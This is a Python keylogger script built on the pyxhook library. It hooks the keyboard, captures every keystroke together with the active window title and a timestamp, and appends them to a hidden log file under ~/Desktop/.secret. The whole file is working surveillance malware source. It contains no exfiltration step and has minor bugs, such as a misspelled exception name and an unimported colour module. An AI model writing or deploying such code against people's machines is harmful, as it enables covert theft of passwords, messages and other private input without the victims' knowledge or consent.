import os, sys
import pyxhook
import datetime

class Variables():
	write = ''
	oldWindowName = ''
	newWindowName = ''

log_file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('~/Desktop/.secret/file.log')
)

cancel_key = ord(
	os.environ.get(
		'pylogger_cancel',
		'`'
	)[0]
)

if os.environ.get('pylogger_clean', None) is not None:
	try:
		os.remove(log_file)
	except EnviromentError:
		pass

def OnKeyPress(event):
	ignore = ["BackSpace", "Alt_LTab", "Control_Lahi", "Control_L", "Control_Lhi", "Alt_L", "Control_L", "Shift_L", ""]
	Variables.newWindowName = event.WindowName
	if Variables.newWindowName != Variables.oldWindowName:
		date = datetime.datetime.now()
		with open(log_file, 'a') as f:
			f.write('{}---{}:\n{}'.format(event.WindowName, date, event.Key))
	else:
		if event.Key == "Return":
			with open(log_file, 'a') as f:
				f.write('{}\n'.format(Variables.write))
			Variables.write=''
		else:
			key = event.Key
			if key in ignore:
				pass
			elif key == "Tab":
				Variables.write+="-->"
			elif key == "Space" or key == "space":
				Variables.write+=" "
			else:
				Variables.write+=key
	Variables.oldWindowName = event.WindowName

if __name__ == "__main__":
	new_hook = pyxhook.HookManager()
	new_hook.KeyDown = OnKeyPress
	new_hook.HookKeyboard()

	try:
		new_hook.start()
	except KeyboardInterrupt:
		print ('{}Stopping the script now...'.format(Fore.RED))
		exit()
	except Exception as ex:
		msg = 'Error while catching events:\n {}'.format(ex)
		pyxhook.print_err(msg)
		with open(log_file, 'a') as f:
			f.write('\n{}'.format(msg))
